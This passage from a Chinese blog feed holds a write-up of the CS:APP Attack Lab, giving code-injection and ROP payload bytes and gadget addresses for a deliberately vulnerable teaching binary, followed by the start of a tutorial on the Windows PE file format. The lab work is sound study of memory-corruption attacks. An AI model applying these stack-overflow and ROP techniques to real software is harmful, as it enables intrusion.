class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   ret    </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40196c:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401971:e8 32 fe ff ff       call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:89 c2                mov    %eax,%edx</span><br><span class="line">  401978:be 88 31 40 00       mov    $0x403188,%esi</span><br><span class="line">  40197d:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401982:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401987:e8 64 f4 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401990:c3                   ret    </span><br><span class="line">  401991:90                   nop</span><br><span class="line">  </span><br><span class="line">  000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:41 54                push   %r12</span><br><span class="line">  40184e:55                   push   %rbp</span><br><span class="line">  40184f:53                   push   %rbx</span><br><span class="line">  401850:48 83 c4 80          add    $0xffffffffffffff80,%rsp    #-128</span><br><span class="line">  401854:41 89 fc             mov    %edi,%r12d</span><br><span class="line">  401857:48 89 f5             mov    %rsi,%rbp</span><br><span class="line">  40185a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax</span><br><span class="line">  401861:00 00 </span><br><span class="line">  401863:48 89 44 24 78       mov    %rax,0x78(%rsp)</span><br><span class="line">  401868:31 c0                xor    %eax,%eax</span><br><span class="line">  40186a:e8 41 f5 ff ff       call   400db0 &lt;random@plt&gt;</span><br><span class="line">  40186f:48 89 c1             mov    %rax,%rcx</span><br><span class="line">  401872:48 ba 0b d7 a3 70 3d movabs $0xa3d70a3d70a3d70b,%rdx</span><br><span class="line">  401879:0a d7 a3 </span><br><span class="line">  40187c:48 f7 ea             imul   %rdx</span><br><span class="line">  40187f:48 01 ca             add    %rcx,%rdx</span><br><span class="line">  401882:48 c1 fa 06          sar    $0x6,%rdx</span><br><span class="line">  401886:48 89 c8             mov    %rcx,%rax</span><br><span class="line">  401889:48 c1 f8 3f          sar    $0x3f,%rax</span><br><span class="line">  40188d:48 29 c2             sub    %rax,%rdx</span><br><span class="line">  401890:48 8d 04 92          lea    (%rdx,%rdx,4),%rax</span><br><span class="line">  401894:48 8d 04 80          lea    (%rax,%rax,4),%rax</span><br><span class="line">  401898:48 c1 e0 02          shl    $0x2,%rax</span><br><span class="line">  40189c:48 29 c1             sub    %rax,%rcx</span><br><span class="line">  40189f:48 8d 1c 0c          lea    (%rsp,%rcx,1),%rbx</span><br><span class="line">  4018a3:45 89 e0             mov    %r12d,%r8d</span><br><span class="line">  4018a6:b9 e2 30 40 00       mov    $0x4030e2,%ecx</span><br><span class="line">  4018ab:48 c7 c2 ff ff ff ff mov    $0xffffffffffffffff,%rdx</span><br><span class="line">  4018b2:be 01 00 00 00       mov    $0x1,%esi</span><br><span class="line">  4018b7:48 89 df             mov    %rbx,%rdi</span><br><span class="line">  4018ba:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4018bf:e8 ac f5 ff ff       call   400e70 &lt;__sprintf_chk@plt&gt;</span><br><span class="line">  4018c4:ba 09 00 00 00       mov    $0x9,%edx</span><br><span class="line">  4018c9:48 89 de             mov    %rbx,%rsi</span><br><span class="line">  4018cc:48 89 ef             mov    %rbp,%rdi</span><br><span class="line">  4018cf:e8 cc f3 ff ff       call   400ca0 &lt;strncmp@plt&gt;</span><br><span class="line">  4018d4:85 c0                test   %eax,%eax</span><br><span class="line">  4018d6:0f 94 c0             sete   %al</span><br><span class="line">  4018d9:0f b6 c0             movzbl %al,%eax</span><br><span class="line">  4018dc:48 8b 74 24 78       mov    0x78(%rsp),%rsi</span><br><span class="line">  4018e1:64 48 33 34 25 28 00 xor    %fs:0x28,%rsi</span><br><span class="line">  4018e8:00 00 </span><br><span class="line">  4018ea:74 05                je     4018f1 &lt;hexmatch+0xa5&gt;</span><br><span class="line">  4018ec:e8 ef f3 ff ff       call   400ce0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4018f1:48 83 ec 80          sub    $0xffffffffffffff80,%rsp</span><br><span class="line">  4018f5:5b                   pop    %rbx</span><br><span class="line">  4018f6:5d                   pop    %rbp</span><br><span class="line">  4018f7:41 5c                pop    %r12</span><br><span class="line">  4018f9:c3                   ret    </span><br><span class="line"></span><br><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:53                   push   %rbx</span><br><span class="line">  4018fb:48 89 fb             mov    %rdi,%rbx        #将rdi里的参数复制到rbx</span><br><span class="line">  4018fe:c7 05 d4 2b 20 00 03 movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:00 00 00 </span><br><span class="line">  401908:48 89 fe             mov    %rdi,%rsi  #参数sval</span><br><span class="line">  40190b:8b 3d d3 2b 20 00    mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:e8 36 ff ff ff       call   40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:85 c0                test   %eax,%eax</span><br><span class="line">  401918:74 23                je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:48 89 da             mov    %rbx,%rdx</span><br><span class="line">  40191d:be 38 31 40 00       mov    $0x403138,%esi</span><br><span class="line">  401922:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401927:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  40192c:e8 bf f4 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:bf 03 00 00 00       mov    $0x3,%edi</span><br><span class="line">  401936:e8 52 03 00 00       call   401c8d &lt;validate&gt;</span><br><span class="line">  40193b:eb 21                jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:48 89 da             mov    %rbx,%rdx</span><br><span class="line">  401940:be 60 31 40 00       mov    $0x403160,%esi</span><br><span class="line">  401945:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40194a:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  40194f:e8 9c f4 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:bf 03 00 00 00       mov    $0x3,%edi</span><br><span class="line">  401959:e8 f1 03 00 00       call   401d4f &lt;fail&gt;</span><br><span class="line">  40195e:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401963:e8 d8 f4 ff ff       call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先调用touch3之前，要确保rdi中有指针，注意参数类型是char*而上一个挑战 <code>void touch2(unsigned val)</code>参数是一个无符号整型，所以这一次我们还要创建一个字符串被rdi中的指针所指。字符串是“59b997fa”，我们将字符串的ascii输入。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>字符串是以**’\0’**结尾的，其ascii是0，检测到0计算机就是到字符串结束了。我们只要将字符串的首地址放入寄存器rdi即可。题目描述中还提到<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132143.png"></p><p>可以看到在调用了hexmatch之后，连续push了三次<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132422.png"></p><p>所以临近返回地址的地方不要存放数据。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825133258.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:48 c7 c7 78 dc 61 55 mov    $0x5561dc78,%rdi</span><br><span class="line">7:68 fa 18 40 00       push   $0x4018fa</span><br><span class="line">c:c3                   ret    </span><br></pre></td></tr></table></figure><p>所以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00 48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00 c3 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55</span><br></pre></td></tr></table></figure><p>注意，最后的四字节的地址不再是栈顶的位置，因为我们的字符串是存放在栈顶的，ret到栈顶程序不会向下执行，我们要ret到mov指令的地址。81&#x3D;78+9</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825135929.png"></p><p>失败了，猜测应该还是被hexmatch和strcmp压入的数据覆盖了，参考了一下，原来还可以将字符串放置在第44个字节后面，即test的栈帧中，因为我们不在返回test所以覆盖那里也没什么影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:48 c7 c7 a8 dc 61 55 mov    $0x5561dca8,%rdi</span><br><span class="line">7:68 fa 18 40 00       push   $0x4018fa</span><br><span class="line">c:c3                   ret  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>注意不能直接跟在44字节后面，因为64位机器ret指令相当于pop八个字节，pop之后rsp+8，所以字符串要在返回地址八个字节之后.0x5561dca8&#x3D;0x5561dc78+0x2c（48字节）。</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825141847.png"></p><p>成功！！！</p><h3 id="实验部分2面向返回的编程："><a href="#实验部分2面向返回的编程：" class="headerlink" title="实验部分2面向返回的编程："></a>实验部分2面向返回的编程：</h3><p>这一部分难度增加，上一部分挑战栈既没有<strong>随机化</strong>也没有<strong>不可执行的内存标记</strong>。栈空间被标记为不可执行区域，所以我们不再能使用注入的shellcode。接下来的挑战要用到ROP ( Return-oriented Programming )即面向返回的编程。</p><p><strong>ROP原理：</strong> </p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825205403.png"></p><p>我们注入的内容被划分为一个个gadget，其实是一个个地址，gatcode有一个显著的特点，即最后一字节内容为c3即ret的机器码，这样一个个gatget就有ret指令连接了起来。既然栈内空间不可执行，那么这个地址要指向哪里呢？答案是程序现有的代码段，举例来说<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210000.png"></p><p>这是一个函数，看起来没什么特别，也没有什么攻击性，但是转化为它的机器级表示<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210117.png"></p><p>其中 <code>48 89 c7</code>是 <code>mov %rax,rdi</code>的机器码，我们只要在返回地址处填充0x400f18(起始地址400f15往后三个字节)即可执行<code>mov %rax,rdi</code>并且由ret弹出栈内的下一个地址继续操作。PDF给出了几张供我们参考攻击的表<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210817.png">                </p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210825.png"></p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210838.png"></p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210846.png"></p><p>好，接下来开搞。！！！</p><h4 id="Level4："><a href="#Level4：" class="headerlink" title="Level4："></a>Level4：</h4><p>这个挑战和2要达到相同的目的，即test在调用完getbuf之后返回执行touch2，执行touch2之前要往%rdi中传递参数cookie。在level2中我们直接在栈中注入了<code>mov cookie，%rdi</code> 的机器码，这次挑战我们只能利用现有的代码执行。</p><p>分为两步，cookie在我们注入的字符串中，要通过pop指令将cookie弹到rdi中，对应的机器码是 <code>5f</code>，可惜的是在给出的gadget中并没有5f，所以我们只能先将cookie弹到一个寄存器，再将这个寄存器的值复制到%rdi中</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825212912.png"></p><p><code>48 89 c7</code>对应 <code>mov %rax,%rdi</code>,地址是0x4019a2</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825213149.png"></p><p><code>58 90 c3</code> 对应 <code>popq %rax  ; nop ; ret</code> 。地址0x4019ab。接下来就该考虑注入的顺序了。</p><p>touch2的地址：0x4017ec。cookie的值0x59b997fa</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825214129.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825221643.png"></p><p>脑子抽了一直用上一个题目测试答案显示失败。。。</p><h4 id="Level5："><a href="#Level5：" class="headerlink" title="Level5："></a>Level5：</h4><p>使用ROP完成level3。这是shellcode实现的操作：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>首先将字符串“35 39 62 39 39 37 66 61 0a 00”入栈，然后将其首地址pop到一个寄存器，然后复制到%edi，然后调用touch3，要考虑到hexmatch和strcmp对栈的影响。由于栈随机化的原因，我们不能直接获得字符串的地址，但是可以通过<code>movl %esp,xxx</code>指令得到当前的栈顶地址，计算出字符串的地址。<strong>movl以寄存器作为目的时会把高四个字节设置为0.</strong></p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826014517.png"></p><p>只有一个选择 <code>48 89 e0</code> 即 <code>mov %rsp,%rax</code>  (或许89 e0),栈顶地址被放入%eax中,地址0x401a07。。。思考了良久之后，我发现无解了，因为仅靠寄存器之间的mov指令和pop指令不可能增加某个寄存器的值，所以我们放入%eax中的值不能发生变化，这显然不可能。</p><p>看了提示之后才恍然大悟，题目并没有局限在mov，movl，popq指令之间，在提供的rop指令中存在大量的lea指令，之前学习过lea指令，加载有效地址，同时它可以进行四则混合运算，在这里我们需要他的<strong>加</strong>运算。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826024848.png"></p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826025317.png"></p><p>检索了全部lea相关的指令，发现只有一个能够使用（其他都是lea    -0x6fa78caf(%rdi),%eax格式，即将%rdi加上一个立即数赋值给%eax）。<code>lea （%rdi,%rsi,1）,%rax</code>的作用是rax&#x3D;rdi+rsi*1，有了这条指令的帮助我们就可以变更栈中存放的地址。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826034218.png"></p><p>只要按照这个思路，计算出X的值即可，实际操作过程中发现没有<code>pop %rsi</code>以及许多相关指令，最终只能用 <code>pop %rax ; mov eax,edx ; mov edx,ecx; mov ecx,esi </code>这四条指令来代替。</p><p><code>pop %rax;ret</code>地址：0x4019ab</p><p><code>mov eax,edx;ret</code>地址：0x401a42</p><p><code>mov edx，ecx；ret</code>地址：0x401a69</p><p><code>mov ecx,esi;ret</code>地址：0x401a13</p><p><code>mov rsp,rax</code>地址：0x401aad</p><p><code>mov rax,rdi</code>地址：0x4019a2</p><p><code>lea    (%rdi,%rsi,1),%rax</code>地址：0x4019d6</p><p><code>mov rax,rdi</code>地址：0x4019a2</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133126.png"></p><p>通过计算，执行mov rsp，rdi的时候rsp的值是48，cookie相对它32个字节即0x20</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133108.png"></p><p>over，学到了很多^_^</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。&lt;/p&gt;
&lt;p&gt;​                                                        !  ^_^ !&lt;/p&gt;</summary>
    
    
    
    
    <category term="csapp" scheme="http://example.com/tags/csapp/"/>
    
    <category term="lab" scheme="http://example.com/tags/lab/"/>
    
  </entry>
  
  <entry>
    <title>PE文件学习篇</title>
    <link href="http://example.com/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
    <id>http://example.com/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/</id>
    <published>2023-08-22T17:20:20.000Z</published>
    <updated>2023-08-22T17:20:20.579Z</updated>
    
    <content type="html"><![CDATA[<p>在《逆向工程核心原理》这本书接触到了PE文件，但是当时学不进去，感觉很晦涩，虽然是一个结构体一个结构体的进行分析，但还是掌握不了。今天在YouTube上找到了一个视频，看了一下有种恍然大明白的感觉。正巧今天看了一期关于国产大飞机C919的视频很有感想，我们的策略是先整体后局部，即不过分死抠细节，不把国产化率排在首位，先造出来一个大飞机，于是我们就有了一张蓝图，知道方向在哪里。学习PE文件这里也是，先整体的过一遍，知道个轮廓，在学起来会容易和有趣不少。</p><span id="more"></span><p>强烈推荐这个<a href="https://www.youtube.com/watch?v=oSpeXGHaKAk&t=15123s">PE教程</a></p><h2 id="PE基础"><a href="#PE基础" class="headerlink" title="PE基础"></a>PE基础</h2><h3 id="PE文件概念"><a href="#PE文件概念" class="headerlink" title="PE文件概念"></a>PE文件概念</h3><p>PE文件(Portable Executable file)，是一种可执行文件格式，满足此格式的文件都可以在Windows操作系统运行。在Linux系统运行的文件是ELF。</p><h4 id="识别PE文件"><a href="#识别PE文件" class="headerlink" title="识别PE文件"></a>识别PE文件</h4><p>通过后缀名判断文件格式是不靠谱的，因为后缀名是可以随意更改的，我们用一个十六进制编辑器打开一个文件，如果他的开头是MZ，且0x3c–0x3f所指示的偏移地址处的值是PE那么我们几乎可以肯定这是个PE文件。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608020344.png"></p><h3 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h3><p>从DOS头到节区头是PE头部分，其下的节区合成PE体。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608015737.png"></p><p>来几张高清大图</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/1379525-20191026162607168-1322217015.jpg"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/1379525-20191026162634249-935893360.jpg"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/1379525-20191030090458584-97459483.jpg"></p><p>我们学习PE文件就是学习这些结构体，先对结构体来个介绍。我们可以通过PEView查看pe文件，将notepad.exe拖入。我们先来分析一下存储时的PE文件，没错PE文件运行时和在硬盘中存储时是不同的。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608021806.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608022014.png"></p><h3 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h3><p><strong>DOS部分</strong>（早期为了兼容DOS所设计）</p><ul><li><p><strong>IMAGE_DOS_HEADER</strong>(64字节)<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608022309.png"></p></li><li><p><strong>MS_DOS Stu</strong>，DOS存根，大小是不固定的，链接器会在这里插入数据，不影响程序运行，病毒程序可以插入在这里。虽然倒下不固定，但我们可以通过IMAGE_DOS_HEADER结构体的最后一个成员PE头开始的位置，用这个值减去64即DOS存根的大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608023411.png"></p></li><li><p>​</p></li></ul><p><strong>PE文件头</strong></p><ul><li><p><strong>IMAGE_NT_HEADERS</strong>即PE头结构体，包括三个部分<strong>PE标识</strong>，<strong>标准PE头</strong>，<strong>扩展PE头</strong><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608024443.png"></p></li><li><p><strong>IMAGE_FILE_HEADER</strong>(20字节)<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608025007.png"></p></li><li><p><strong>IMAGE_OPTIONAL_HEADER</strong>（32位）(224字节)（可扩展），IMAGE_FILE_HEADER结构体的一个成员记录该结构体的大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608025535.png"></p></li></ul><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608025929.png"></p><p><strong>节表</strong> （记录节的信息）</p><ul><li><p><strong>IMAGE_SECTION_HEADER</strong> (40字节)</p><p>有几个节区就有几个这样的结构体</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608030333.png"></p></li></ul><p>​        IMAGE_SECTION_HEADER .text<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608030430.png"></p><p>节表后面是一些意义不大的数据，我们可以有效利用这些空间，所以节表和节表数据是不相邻的。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608030736.png"></p><p>在可选头结构体中有一个成员记录<strong>PE头</strong>(DOS头+PE文件头+节表)的大小<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608031239.png"></p><h4 id="文件对齐"><a href="#文件对齐" class="headerlink" title="文件对齐"></a>文件对齐</h4><p>大小要满足是最小单位的整数倍，这样做可以提高效率。牺牲一定空间换取时间。节数据也要满足文件对齐。文件对齐上面的成员记录着内存对齐的大小，即程序加载到内存中后的对齐单位<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608034852.png"></p><h4 id="PE文件有两种状态："><a href="#PE文件有两种状态：" class="headerlink" title="PE文件有两种状态："></a>PE文件有两种状态：</h4><p>磁盘状态（存储）</p><p>内存状态（运行）</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608032628.png"></p><h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h4><p>Q:为什么文件对齐参数与内存对齐参数不相同？</p><p>A:因为它们分别用于优化文件I&#x2F;O和虚拟内存管理。</p><h3 id="DOS头属性说明"><a href="#DOS头属性说明" class="headerlink" title="DOS头属性说明"></a>DOS头属性说明</h3><p>IMAGE_DOS_HEADER结构体是为了早期16位程序而准备的，现在已经弃用除了头尾两个成员，其余的都是可以更改的<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608040613.png"></p><p>更改之后不影响程序运行。</p><h3 id="PE头属性说明"><a href="#PE头属性说明" class="headerlink" title="PE头属性说明"></a>PE头属性说明</h3><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608024443.png"></p><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>4个字节的签名。更改之后不可运行。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141251.png"></p><h4 id="IMAGE-FILE-HEADER-（标准PE头）"><a href="#IMAGE-FILE-HEADER-（标准PE头）" class="headerlink" title="IMAGE_FILE_HEADER   （标准PE头）"></a>IMAGE_FILE_HEADER   （标准PE头）</h4><p>长度20字节。<img 